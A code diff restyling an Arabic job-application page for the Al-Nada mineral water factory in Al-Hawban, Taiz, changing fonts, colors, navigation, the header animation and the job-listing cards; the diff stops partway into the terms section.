@@ -6,324 +6,498 @@
 <title>مصنع الندى للمياه المعدنية - بوابة التوظيف | الحوبان</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --primary: #0066a1;
-    --primary-dark: #00436b;
-    --accent: #00b4d8;
-    --accent-light: #e0f7fa;
-    --bg: #f4f9fc;
-    --text: #1e293b;
-    --text-muted: #64748b;
-    --white: #ffffff;
-    --shadow: 0 10px 30px rgba(0, 102, 161, 0.08);
-    --radius: 18px;
+    --deep-blue: #03045e;
+    --royal-blue: #0077b6;
+    --aqua: #00b4d8;
+    --sky-light: #90e0ef;
+    --ice-bg: #f0f7ff;
+    --card-bg: #ffffff;
+    --text-main: #0f172a;
+    --text-soft: #475569;
+    --gradient-main: linear-gradient(135deg, #023e8a 0%, #0077b6 45%, #00b4d8 100%);
+    --gradient-btn: linear-gradient(135deg, #0077b6 0%, #00b4d8 50%, #48cae4 100%);
+    --shadow-soft: 0 15px 35px rgba(0, 119, 182, 0.1);
+    --shadow-hover: 0 20px 40px rgba(0, 180, 216, 0.22);
   }
 
   * {
     margin: 0;
     padding: 0;
     box-sizing: border-box;
-    font-family: 'Tajawal', sans-serif;
+    font-family: 'Cairo', sans-serif;
   }
 
   html { scroll-behavior: smooth; }
+
   body {
-    background-color: var(--bg);
-    color: var(--text);
-    line-height: 1.7;
+    background-color: var(--ice-bg);
+    background-image: 
+      radial-gradient(at 0% 0%, rgba(0, 180, 216, 0.12) 0px, transparent 50%),
+      radial-gradient(at 100% 20%, rgba(0, 119, 182, 0.1) 0px, transparent 50%),
+      radial-gradient(at 50% 100%, rgba(144, 224, 239, 0.18) 0px, transparent 50%);
+    color: var(--text-main);
+    line-height: 1.75;
     overflow-x: hidden;
   }
 
-  /* ===== الهيدر والتموجات ===== */
+  /* ===== شريط التنقل الزجاجي العائم ===== */
+  .top-nav {
+    position: sticky;
+    top: 12px;
+    z-index: 1000;
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 0 15px;
+  }
+
+  .nav-inner {
+    background: rgba(255, 255, 255, 0.85);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    border: 1px solid rgba(255, 255, 255, 0.9);
+    border-radius: 50px;
+    padding: 10px 22px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 8px 25px rgba(2, 62, 138, 0.1);
+    flex-wrap: wrap;
+    gap: 10px;
+  }
+
+  .brand-mini {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 900;
+    color: var(--royal-blue);
+    font-size: 17px;
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  .nav-links a {
+    text-decoration: none;
+    color: var(--text-main);
+    font-size: 14px;
+    font-weight: 700;
+    padding: 6px 14px;
+    border-radius: 30px;
+    transition: 0.3s;
+  }
+
+  .nav-links a:hover {
+    background: rgba(0, 180, 216, 0.12);
+    color: var(--royal-blue);
+  }
+
+  .nav-links a.btn-nav {
+    background: var(--gradient-main);
+    color: #fff;
+    box-shadow: 0 4px 12px rgba(0, 119, 182, 0.3);
+  }
+
+  .nav-links a.btn-nav:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 16px rgba(0, 180, 216, 0.45);
+  }
+
+  /* ===== الهيدر الرئيسي مع الفقاعات المتحركة ===== */
   header {
-    background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 50%, var(--accent) 100%);
-    color: var(--white);
-    padding: 50px 20px 90px;
+    background: var(--gradient-main);
+    color: #fff;
+    margin-top: -55px;
+    padding: 110px 20px 100px;
     text-align: center;
+    position: relative;
+    overflow: hidden;
+    border-bottom-left-radius: 40px;
+    border-bottom-right-radius: 40px;
+    box-shadow: 0 15px 35px rgba(2, 62, 138, 0.2);
+  }
+
+  /* فقاعات متحركة */
+  .bubbles {
+    position: absolute;
+    inset: 0;
+    overflow: hidden;
+    pointer-events: none;
+  }
+
+  .bubbles span {
+    position: absolute;
+    bottom: -50px;
+    background: rgba(255, 255, 255, 0.14);
+    border-radius: 50%;
+    animation: rise 12s infinite ease-in;
+  }
+
+  .bubbles span:nth-child(1) { width: 40px; height: 40px; left: 10%; animation-duration: 9s; }
+  .bubbles span:nth-child(2) { width: 20px; height: 20px; left: 25%; animation-duration: 7s; animation-delay: 2s; }
+  .bubbles span:nth-child(3) { width: 55px; height: 55px; left: 45%; animation-duration: 11s; animation-delay: 1s; }
+  .bubbles span:nth-child(4) { width: 28px; height: 28px; left: 68%; animation-duration: 8s; animation-delay: 3s; }
+  .bubbles span:nth-child(5) { width: 45px; height: 45px; left: 85%; animation-duration: 10s; animation-delay: 0.5s; }
+
+  @keyframes rise {
+    0% { transform: translateY(0) scale(1); opacity: 0; }
+    30% { opacity: 0.7; }
+    100% { transform: translateY(-450px) scale(1.3); opacity: 0; }
+  }
+
+  .hero-badge {
+    display: inline-block;
+    background: rgba(255, 255, 255, 0.18);
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    backdrop-filter: blur(6px);
+    padding: 6px 18px;
+    border-radius: 50px;
+    font-size: 13px;
+    font-weight: 700;
+    margin-bottom: 16px;
+    letter-spacing: 0.3px;
+  }
+
+  .drop-emblem {
+    width: 90px;
+    height: 90px;
+    margin: 0 auto 18px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 28px;
+    transform: rotate(45deg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+    border: 2px solid rgba(255, 255, 255, 0.45);
+  }
+
+  .drop-emblem svg {
+    transform: rotate(-45deg);
+    width: 48px;
+    height: 58px;
+  }
+
+  header h1 {
+    font-size: 36px;
+    font-weight: 900;
+    margin-bottom: 10px;
+    text-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+  }
+
+  header p {
+    font-size: 17px;
+    max-width: 620px;
+    margin: 0 auto 25px;
+    opacity: 0.95;
+  }
+
+  .hero-cta {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    background: #ffffff;
+    color: var(--royal-blue);
+    text-decoration: none;
+    font-weight: 800;
+    font-size: 16px;
+    padding: 14px 32px;
+    border-radius: 50px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.18);
+    transition: all 0.3s ease;
+  }
+
+  .hero-cta:hover {
+    transform: translateY(-3px) scale(1.03);
+    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.25);
+  }
+
+  /* ===== الحاوية والأقسام ===== */
+  section {
+    max-width: 960px;
+    margin: 45px auto;
+    padding: 0 20px;
+  }
+
+  .sec-header {
+    text-align: center;
+    margin-bottom: 26px;
+  }
+
+  .sec-header span.tag {
+    display: inline-block;
+    background: rgba(0, 180, 216, 0.14);
+    color: var(--royal-blue);
+    font-weight: 800;
+    font-size: 13px;
+    padding: 4px 14px;
+    border-radius: 20px;
+    margin-bottom: 6px;
+  }
+
+  .sec-header h2 {
+    font-size: 28px;
+    font-weight: 900;
+    color: var(--deep-blue);
+  }
+
+  .glass-card {
+    background: var(--card-bg);
+    border-radius: 24px;
+    padding: 32px;
+    box-shadow: var(--shadow-soft);
+    border: 1px solid rgba(0, 180, 216, 0.15);
     position: relative;
   }
 
-  .drop-container {
-    width: 85px;
-    height: 85px;
-    margin: 0 auto 15px;
-    background: rgba(255, 255, 255, 0.15);
-    backdrop-filter: blur(8px);
+  /* ===== بطاقات المميزات ===== */
+  .features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin-top: 24px;
+  }
+
+  .feat-item {
+    background: linear-gradient(160deg, #f4fbff 0%, #e6f6fe 100%);
+    border-radius: 18px;
+    padding: 22px;
+    border: 1px solid #ccebf9;
+    transition: 0.3s;
+  }
+
+  .feat-item:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 12px 24px rgba(0, 180, 216, 0.14);
+  }
+
+  .feat-icon {
+    width: 48px;
+    height: 48px;
+    background: var(--gradient-main);
+    color: #fff;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    margin-bottom: 12px;
+    box-shadow: 0 6px 15px rgba(0, 119, 182, 0.25);
+  }
+
+  .feat-item h4 { font-size: 17px; font-weight: 800; color: var(--deep-blue); margin-bottom: 6px; }
+  .feat-item p { font-size: 14px; color: var(--text-soft); }
+
+  /* ===== بطاقات الوظائف ===== */
+  .jobs-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+    gap: 16px;
+  }
+
+  .job-box {
+    background: #ffffff;
+    border: 2px solid #e6f2fa;
+    border-radius: 18px;
+    padding: 20px 18px;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .job-box::before {
+    content: "";
+    position: absolute;
+    top: 0; right: 0;
+    width: 5px; height: 100%;
+    background: var(--gradient-main);
+    opacity: 0;
+    transition: 0.3s;
+  }
+
+  .job-box:hover {
+    border-color: var(--aqua);
+    transform: translateY(-5px);
+    box-shadow: var(--shadow-hover);
+  }
+
+  .job-box:hover::before { opacity: 1; }
+
+  .job-emoji {
+    font-size: 28px;
+    margin-bottom: 10px;
+    display: block;
+  }
+
+  .job-box h4 {
+    font-size: 16px;
+    font-weight: 800;
+    color: var(--deep-blue);
+    margin-bottom: 10px;
+  }
+
+  .apply-pill {
+    display: inline-block;
+    background: #e0f7fa;
+    color: var(--royal-blue);
+    font-size: 12px;
+    font-weight: 800;
+    padding: 4px 12px;
+    border-radius: 20px;
+    transition: 0.3s;
+  }
+
+  .job-box:hover .apply-pill {
+    background: var(--royal-blue);
+    color: #fff;
+  }
+
+  /* ===== الشروط والمزايا ===== */
+  .split-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 22px;
+  }
+
+  .list-card h3 {
+    font-size: 20px;
+    font-weight: 800;
+    color: var(--royal-blue);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .nice-list { list-style: none; }
+  .nice-list li {
+    position: relative;
+    padding-right: 30px;
+    margin-bottom: 12px;
+    font-size: 15px;
+    color: var(--text-main);
+  }
+
+  .nice-list li::before {
+    content: "✦";
+    position: absolute;
+    right: 0;
+    top: 0;
+    width: 22px;
+    height: 22px;
+    background: rgba(0, 180, 216, 0.15);
+    color: var(--royal-blue);
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
-    border: 1px solid rgba(255, 255, 255, 0.3);
-    animation: float 3s ease-in-out infinite;
+    font-size: 12px;
   }
 
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
-  }
-
-  header h1 {
-    font-size: 32px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-    margin-bottom: 8px;
-  }
-
-  header .subtitle {
-    font-size: 16px;
-    opacity: 0.92;
-    max-width: 600px;
-    margin: 0 auto;
-  }
-
-  nav {
-    margin-top: 25px;
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 10px;
-  }
-
-  nav a {
-    color: var(--white);
-    text-decoration: none;
-    padding: 8px 18px;
-    background: rgba(255, 255, 255, 0.12);
-    border: 1px solid rgba(255, 255, 255, 0.25);
-    border-radius: 50px;
-    font-size: 14px;
-    font-weight: 500;
-    transition: all 0.3s ease;
-  }
-
-  nav a:hover, nav a.cta-nav {
-    background: var(--white);
-    color: var(--primary);
-    font-weight: 700;
-    transform: translateY(-2px);
-  }
-
-  .wave {
-    position: absolute;
-    bottom: -1px;
-    left: 0;
-    width: 100%;
-    overflow: hidden;
-    line-height: 0;
-  }
-
-  .wave svg {
-    position: relative;
-    display: block;
-    width: calc(100% + 1.3px);
-    height: 55px;
-  }
-
-  /* ===== الأقسام العامة ===== */
-  section {
-    max-width: 960px;
-    margin: 35px auto;
-    padding: 0 20px;
-  }
-
-  .section-title {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    color: var(--primary-dark);
-    font-size: 24px;
-    font-weight: 800;
-    margin-bottom: 18px;
-  }
-
-  .section-title span {
-    background: var(--accent-light);
-    color: var(--primary);
-    width: 40px;
-    height: 40px;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    border-radius: 12px;
-    font-size: 20px;
-  }
-
-  .card {
-    background: var(--white);
-    border-radius: var(--radius);
-    padding: 28px;
-    box-shadow: var(--shadow);
-    border: 1px solid rgba(0, 180, 216, 0.12);
-  }
-
-  /* ===== المميزات ===== */
-  .features-grid {
+  /* ===== الموقع وأرقام التواصل ===== */
+  .phones-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 16px;
-    margin-top: 20px;
-  }
-
-  .feature-box {
-    background: linear-gradient(145deg, #f8fcff, #ebf7fd);
-    border-radius: 14px;
-    padding: 18px;
-    border: 1px solid #d7eef9;
-    transition: transform 0.25s ease;
-  }
-
-  .feature-box:hover { transform: translateY(-4px); }
-  .feature-box h4 { color: var(--primary); font-size: 16px; margin-bottom: 6px; }
-  .feature-box p { font-size: 14px; color: var(--text-muted); }
-
-  /* ===== بطاقات الوظائف التفاعلية ===== */
-  .jobs-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
-    gap: 14px;
-  }
-
-  .job-card {
-    background: #f8fbfe;
-    border: 1.5px solid #e1eff7;
-    border-radius: 14px;
-    padding: 16px;
-    cursor: pointer;
-    transition: all 0.25s ease;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-  }
-
-  .job-card:hover {
-    border-color: var(--accent);
-    background: var(--white);
-    box-shadow: 0 8px 20px rgba(0, 180, 216, 0.15);
-    transform: translateY(-3px);
-  }
-
-  .job-card h4 { color: var(--primary-dark); font-size: 16px; margin-bottom: 8px; }
-  .job-card span {
-    font-size: 13px;
-    color: var(--primary);
-    font-weight: 700;
-    display: inline-flex;
-    align-items: center;
-    gap: 4px;
-  }
-
-  /* ===== الشروط والضمانات ===== */
-  .two-cols {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-    gap: 20px;
-  }
-
-  .styled-list { list-style: none; }
-  .styled-list li {
-    position: relative;
-    padding-right: 26px;
-    margin-bottom: 10px;
-    font-size: 15px;
-  }
-
-  .styled-list li::before {
-    content: "✔";
-    position: absolute;
-    right: 0;
-    color: var(--accent);
-    font-weight: bold;
-  }
-
-  /* ===== الموقع والتواصل ===== */
-  .info-row {
-    display: flex;
-    flex-wrap: wrap;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
     gap: 15px;
-    margin-top: 15px;
+    margin-top: 18px;
   }
 
-  .contact-pill {
-    flex: 1;
-    min-width: 220px;
-    background: #f0f8ff;
-    padding: 14px 18px;
-    border-radius: 12px;
+  .phone-card {
+    background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+    border: 1.5px solid #bae6fd;
+    border-radius: 16px;
+    padding: 16px 20px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    border: 1px solid #d0e8f7;
   }
 
-  .contact-pill a {
-    color: var(--primary);
-    font-weight: 800;
-    font-size: 17px;
+  .phone-card span { font-weight: 700; color: var(--deep-blue); font-size: 14px; }
+  .phone-card a {
+    background: var(--royal-blue);
+    color: #fff;
     text-decoration: none;
+    padding: 6px 14px;
+    border-radius: 10px;
+    font-weight: 800;
+    font-size: 16px;
     direction: ltr;
+    transition: 0.2s;
   }
 
-  /* ===== نموذج التسجيل ===== */
+  .phone-card a:hover { background: var(--deep-blue); }
+
+  /* ===== نموذج التقديم الفخم ===== */
+  .form-wrapper {
+    background: linear-gradient(180deg, #ffffff 0%, #f7fcff 100%);
+    border: 2px solid #cbe9f8;
+  }
+
   .form-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-    gap: 16px;
+    gap: 18px;
   }
 
-  .form-group { margin-bottom: 4px; }
-  .form-group.full { grid-column: 1 / -1; }
+  .field.full { grid-column: 1 / -1; }
 
-  label {
+  .field label {
     display: block;
-    font-weight: 700;
-    color: var(--primary-dark);
-    margin-bottom: 6px;
+    font-weight: 800;
+    color: var(--deep-blue);
+    margin-bottom: 7px;
     font-size: 14px;
   }
 
-  input, select, textarea {
+  .field input, .field select, .field textarea {
     width: 100%;
-    padding: 13px 15px;
-    border: 1.5px solid #d8e6f0;
-    border-radius: 12px;
-    font-size: 15px;
-    background: #f9fcfe;
-    color: var(--text);
-    transition: all 0.2s ease;
-  }
-
-  input:focus, select:focus, textarea:focus {
-    outline: none;
-    border-color: var(--accent);
-    background: var(--white);
-    box-shadow: 0 0 0 4px rgba(0, 180, 216, 0.15);
-  }
-
-  textarea { resize: vertical; min-height: 90px; }
-
-  .submit-btn {
-    width: 100%;
-    margin-top: 22px;
-    padding: 16px;
-    border: none;
+    padding: 14px 16px;
+    border: 2px solid #dbeafe;
     border-radius: 14px;
-    background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-    color: var(--white);
+    font-size: 15px;
+    background: #ffffff;
+    color: var(--text-main);
+    transition: all 0.25s ease;
+  }
+
+  .field input:focus, .field select:focus, .field textarea:focus {
+    outline: none;
+    border-color: var(--aqua);
+    box-shadow: 0 0 0 4px rgba(0, 180, 216, 0.18);
+  }
+
+  .field textarea { min-height: 95px; resize: vertical; }
+
+  .btn-submit {
+    width: 100%;
+    margin-top: 25px;
+    padding: 17px;
+    border: none;
+    border-radius: 16px;
+    background: var(--gradient-btn);
+    background-size: 200% auto;
+    color: #fff;
     font-size: 18px;
-    font-weight: 800;
+    font-weight: 900;
     cursor: pointer;
-    box-shadow: 0 8px 20px rgba(0, 102, 161, 0.25);
-    transition: all 0.3s ease;
+    box-shadow: 0 10px 25px rgba(0, 119, 182, 0.35);
+    transition: all 0.4s ease;
   }
 
-  .submit-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 12px 25px rgba(0, 102, 161, 0.35);
+  .btn-submit:hover {
+    background-position: right center;
+    transform: translateY(-3px);
+    box-shadow: 0 15px 30px rgba(0, 180, 216, 0.45);
   }
 
-  .submit-btn:disabled {
+  .btn-submit:disabled {
     opacity: 0.65;
     cursor: not-allowed;
     transform: none;
@@ -332,102 +506,130 @@
   .msg {
     display: none;
     margin-top: 16px;
-    padding: 14px;
-    border-radius: 12px;
+    padding: 15px;
+    border-radius: 14px;
     text-align: center;
     font-weight: 700;
   }
 
-  .err { display: block; background: #fee2e2; color: #b91c1c; border: 1px solid #fecaca; }
+  .err { display: block; background: #fee2e2; color: #b91c1c; border: 1px solid #fca5a5; }
 
-  /* ===== رسالة النجاح ===== */
+  /* ===== شاشة النجاح ===== */
   #thanks {
     display: none;
     text-align: center;
-    padding: 40px 20px;
-    background: linear-gradient(145deg, #ecfdf5, #d1fae5);
-    border-radius: 16px;
-    border: 2px solid #10b981;
+    padding: 45px 25px;
+    background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
+    border-radius: 20px;
+    border: 2px solid #34d399;
   }
 
-  #thanks .check-icon {
-    width: 70px;
-    height: 70px;
-    background: #10b981;
-    color: white;
+  .success-circle {
+    width: 80px;
+    height: 80px;
+    background: linear-gradient(135deg, #10b981, #059669);
+    color: #fff;
     border-radius: 50%;
     display: inline-flex;
     align-items: center;
     justify-content: center;
-    font-size: 36px;
-    margin-bottom: 15px;
+    font-size: 40px;
+    margin-bottom: 16px;
+    box-shadow: 0 10px 25px rgba(16, 185, 129, 0.35);
   }
 
-  #thanks h3 { color: #065f46; font-size: 24px; margin-bottom: 8px; }
-  #thanks p { color: #047857; font-size: 15px; }
+  #thanks h3 { color: #065f46; font-size: 26px; font-weight: 900; margin-bottom: 10px; }
+  #thanks p { color: #047857; font-size: 16px; }
 
   /* ===== الفوتر ===== */
   footer {
-    background: var(--primary-dark);
-    color: #cbd5e1;
+    background: linear-gradient(135deg, #03045e 0%, #023e8a 100%);
+    color: #e0f2fe;
     text-align: center;
-    padding: 35px 20px;
-    margin-top: 60px;
-    font-size: 14px;
+    padding: 45px 20px;
+    margin-top: 70px;
+    border-top-left-radius: 35px;
+    border-top-right-radius: 35px;
   }
 
-  footer strong { color: var(--white); font-size: 16px; }
+  footer h3 { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 6px; }
+  footer .copy { margin-top: 16px; font-size: 13px; opacity: 0.75; }
+
+  @media (max-width: 600px) {
+    header h1 { font-size: 28px; }
+    .nav-inner { justify-content: center; border-radius: 24px; }
+    .glass-card { padding: 22px 18px; }
+  }
 </style>
 </head>
 <body>
 
+<!-- ===== شريط التنقل العائم ===== -->
+<div class="top-nav">
+  <div class="nav-inner">
+    <div class="brand-mini">💧 مصنع الندى</div>
+    <div class="nav-links">
+      <a href="#about">عن المصنع</a>
+      <a href="#jobs">الوظائف</a>
+      <a href="#terms">المزايا</a>
+      <a href="#location">الموقع</a>
+      <a href="#apply" class="btn-nav">سجّل الآن</a>
+    </div>
+  </div>
+</div>
+
+<!-- ===== الهيدر الرئيسي ===== -->
 <header>
-  <div class="drop-container">
-    <svg width="45" height="58" viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+  <div class="bubbles">
+    <span></span><span></span><span></span><span></span><span></span>
+  </div>
+
+  <div class="hero-badge">✨ انضم إلى فريق العمل المتميز في تعز - الحوبان</div>
+
+  <div class="drop-emblem">
+    <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
       <defs>
-        <linearGradient id="waterGrad" x1="0" y1="0" x2="0" y2="1">
+        <linearGradient id="dropG" x1="0" y1="0" x2="0" y2="1">
           <stop offset="0%" stop-color="#ffffff"/>
-          <stop offset="100%" stop-color="#bae6fd"/>
+          <stop offset="100%" stop-color="#90e0ef"/>
         </linearGradient>
       </defs>
-      <path d="M50 5 C50 5 15 55 15 85 a35 35 0 0 0 70 0 C85 55 50 5 50 5 Z" fill="url(#waterGrad)"/>
-      <ellipse cx="38" cy="75" rx="7" ry="13" fill="#0066a1" opacity="0.25"/>
+      <path d="M50 5 C50 5 15 55 15 85 a35 35 0 0 0 70 0 C85 55 50 5 50 5 Z" fill="url(#dropG)"/>
+      <ellipse cx="38" cy="75" rx="7" ry="13" fill="#0077b6" opacity="0.25"/>
     </svg>
   </div>
-  <h1>مصنع الندى للمياه المعدنية</h1>
-  <p class="subtitle">بوابة التوظيف الرسمية — الحوبان، بجوار مصانع هائل سعيد أنعم</p>
-  <nav>
-    <a href="#about">عن المصنع</a>
-    <a href="#jobs">الوظائف المتاحة</a>
-    <a href="#terms">الشروط والمزايا</a>
-    <a href="#location">الموقع والتواصل</a>
-    <a href="#apply" class="cta-nav">قدّم طلبك الآن</a>
-  </nav>
 
-  <div class="wave">
-    <svg viewBox="0 0 1200 120" preserveAspectRatio="none">
-      <path d="M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V120H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z" fill="#f4f9fc"></path>
-    </svg>
-  </div>
+  <h1>مصنع الندى للمياه المعدنية</h1>
+  <p>نبحث عن الكفاءات الطموحة للانضمام إلى كادرنا في الحوبان — بجوار مصانع هائل سعيد أنعم</p>
+  <a href="#apply" class="hero-cta">🚀 قدّم طلب التوظيف الإلكتروني الآن</a>
 </header>
 
 <!-- ===== عن المصنع ===== -->
 <section id="about">
-  <h2 class="section-title"><span>🏢</span> عن مصنع الندى</h2>
-  <div class="card">
-    <p>يُعد مصنع <strong>الندى للمياه المعدنية</strong> من المنشآت الرائدة في تعبئة وتنقية المياه المعدنية وفق أعلى المعايير الصحية والرقابية، لنقدم منتجًا نقيًا يليق بالمستهلك اليمني. يقع المصنع في منطقة <strong>الحوبان</strong> بجوار مصانع <strong>هائل سعيد أنعم</strong>.</p>
-    <div class="features-grid">
-      <div class="feature-box">
-        <h4>💧 جودة ومعايير عالمية</h4>
-        <p>مياه معدنية نقية تخضع لفحوصات مخبرية دقيقة ومستمرة.</p>
+  <div class="sec-header">
+    <span class="tag">من نحن</span>
+    <h2>الجودة والنقاء في كل قطرة</h2>
+  </div>
+  <div class="glass-card">
+    <p style="font-size:16px; text-align:center; max-width:750px; margin:0 auto;">
+      يُعد <strong>مصنع الندى للمياه المعدنية</strong> صرحاً صناعياً رائداً في إنتاج وتعبئة المياه المعدنية النقية في منطقة <strong>الحوبان</strong> بجوار مصانع <strong>هائل سعيد أنعم</strong>، حيث نجمع بين أحدث التقنيات العالمية وأعلى معايير السلامة المهنية.
+    </p>
+
+    <div class="features">
+      <div class="feat-item">
+        <div class="feat-icon">💧</div>
+        <h4>نقاء معتمد</h4>
+        <p>مختبرات فحص دقيقة تضمن أعلى درجات النقاء والجودة الصحية.</p>
       </div>
-      <div class="feature-box">
-        <h4>⚙️ خطوط إنتاج حديثة</h4>
-        <p>أحدث تقنيات التعبئة والتعقيم الآلي المتكامل.</p>
+      <div class="feat-item">
+        <div class="feat-icon">⚙️</div>
+        <h4>تقنيات حديثة</h4>
+        <p>خطوط إنتاج آلية متطورة تعمل وفق معايير التصنيع العالمية.</p>
       </div>
-      <div class="feature-box">
-        <h4>🤝 استقرار وتطور وظيفي</h4>
-        <p>بيئة عمل احترافية تقدر الكفاءة وتدعم التطور المستمر.</p>
+      <div class="feat-item">
+        <div class="feat-icon">🌟</div>
+        <h4>بيئة محفزة</h4>
+        <p>نستثمر في كوادرنا البشرية ونوفر فرصاً حقيقية للنمو والتطور.</p>
       </div>
     </div>
   </div>
@@ -435,132 +637,154 @@
 
 <!-- ===== الوظائف المتاحة ===== -->
 <section id="jobs">
-  <h2 class="section-title"><span>💼</span> الوظائف المتاحة (اختر للتقديم المباشر)</h2>
-  <div class="card">
-    <div class="jobs-grid">
-      <div class="job-card" onclick="selectJob('مشغل خطوط إنتاج')">
-        <h4>مشغل خطوط إنتاج</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('عامل تخزين ومستودعات')">
-        <h4>عامل تخزين ومستودعات</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('سائق شاحنة / توصيل')">
-        <h4>سائق شاحنة / توصيل</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('مندوب مبيعات وتوزيع')">
-        <h4>مندوب مبيعات وتوزيع</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('فني صيانة كهربائية وميكانيكية')">
-        <h4>فني صيانة كهربائية وميكانيكية</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('محاسب')">
-        <h4>محاسب</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('مسؤول موارد بشرية')">
-        <h4>مسؤول موارد بشرية</h4>
-        <span>تقديم الآن ←</span>
-      </div>
-      <div class="job-card" onclick="selectJob('عامل نظافة وتغليف')">
-        <h4>عامل نظافة وتغليف</h4>
-        <span>تقديم الآن ←</span>
-      </div>
+  <div class="sec-header">
+    <span class="tag">الفرص الوظيفية</span>
+    <h2>الوظائف الشاغرة المتاحة حالياً</h2>
+    <p style="color:var(--text-soft); font-size:14px;">اضغط على الوظيفة المناسبة لك ليتم تحديدها تلقائياً في استمارة التسجيل</p>
+  </div>
+
+  <div class="jobs-grid">
+    <div class="job-box" onclick="chooseJob('مشغل خطوط إنتاج')">
+      <span class="job-emoji">🏭</span>
+      <h4>مشغل خطوط إنتاج</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('عامل تخزين ومستودعات')">
+      <span class="job-emoji">📦</span>
+      <h4>عامل تخزين ومستودعات</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('سائق شاحنة / توصيل')">
+      <span class="job-emoji">🚛</span>
+      <h4>سائق شاحنة / توصيل</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('مندوب مبيعات وتوزيع')">
+      <span class="job-emoji">📈</span>
+      <h4>مندوب مبيعات وتوزيع</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('فني صيانة كهربائية وميكانيكية')">
+      <span class="job-emoji">🛠️</span>
+      <h4>فني صيانة كهربائية وميكانيكية</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('محاسب')">
+      <span class="job-emoji">💻</span>
+      <h4>محاسب</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('مسؤول موارد بشرية')">
+      <span class="job-emoji">👔</span>
+      <h4>مسؤول موارد بشرية</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
+    </div>
+
+    <div class="job-box" onclick="chooseJob('عامل نظافة وتغليف')">
+      <span class="job-emoji">✨</span>
+      <h4>عامل نظافة وتغليف</h4>
+      <span class="apply-pill">تقديم الآن ←</span>
     </div>
   </div>
 </section>
 
-<!-- ===== الشروط والضمانات ===== -->
+<!-- ===== الشروط والمزايا ===== -->
 <section id="terms">
-  <div class="two-cols">
-    <div>
